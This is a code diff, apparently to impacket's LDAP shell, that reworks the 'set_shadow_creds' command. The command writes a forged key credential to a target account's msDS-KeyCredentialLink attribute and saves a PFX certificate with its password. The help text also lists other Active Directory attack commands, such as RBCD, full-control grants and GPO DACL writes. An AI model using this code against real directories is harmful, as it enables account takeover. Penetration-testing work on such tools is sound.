@@ -17,6 +17,7 @@ import string
 import sys
 import cmd
 import random
+import uuid
 import ldap3
 from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
 from ldap3.utils.conv import escape_filter_chars
@@ -26,10 +27,7 @@ from impacket import LOG
 from ldap3.protocol.microsoft import security_descriptor_control
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.ldap import ldaptypes
-from dsinternals.system.Guid import Guid
-from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
-from dsinternals.system.DateTime import DateTime
-from dsinternals.common.data.hello.KeyCredential import KeyCredential
+from impacket.examples.ntlmrelayx.utils import shadow_credentials
 
 
 class LdapShell(cmd.Cmd):
@@ -615,7 +613,7 @@ class LdapShell(cmd.Cmd):
         args = shlex.split(line)
 
         if len(args) != 1:
-            raise Exception("Error expecting target name for shadow credentials attack. Recieved %d arguments instead." % len(args))
+            raise Exception("Error expected target name for shadow credentials attack. Received %d arguments instead." % len(args))
 
         target_name = args[0]
 
@@ -628,19 +626,19 @@ class LdapShell(cmd.Cmd):
         print("Found Target DN: %s" % target.entry_dn)
         print("Target SID: %s\n" % target_sid)
 
-        certificate = X509Certificate2(subject=target_name, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
-        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target.entry_dn, currentTime=DateTime())
-        print("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
-
+        key, certificate = shadow_credentials.createSelfSignedX509Certificate(target_name, 0, 2592000) # valid for 30 days
+        device_id = uuid.uuid4()
+        key_credential = shadow_credentials.KeyCredential(certificate, key, device_id.bytes, shadow_credentials.getTicksNow())
+        print("KeyCredential generated with DeviceID: %s" % device_id)
         try:
-            new_values = target['msDS-KeyCredentialLink'].raw_values + [keyCredential.toDNWithBinary().toString()]
-            self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+            new_entry = shadow_credentials.toDNWithBinary2String(key_credential.dumpBinary(), target.entry_dn)
+            self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_ADD, new_entry]})
             print("Shadow credentials successfully added!")
             if self.client.result['result'] == 0:
                 path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                 password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                certificate.ExportPFX(password=password, path_to_file=path)
-                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                shadow_credentials.exportPFX(certificate, key, path, password)
+                print("Saved PFX (#PKCS12) certificate & key at path: %s.pfx" % path)
                 print("Must be used with password: %s" % password)
             else:
                 if self.client.result['result'] == 50:
@@ -743,7 +741,7 @@ class LdapShell(cmd.Cmd):
  grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
  set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
  set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
-set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
+ set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
  start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
  write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
  whoami - get connected user
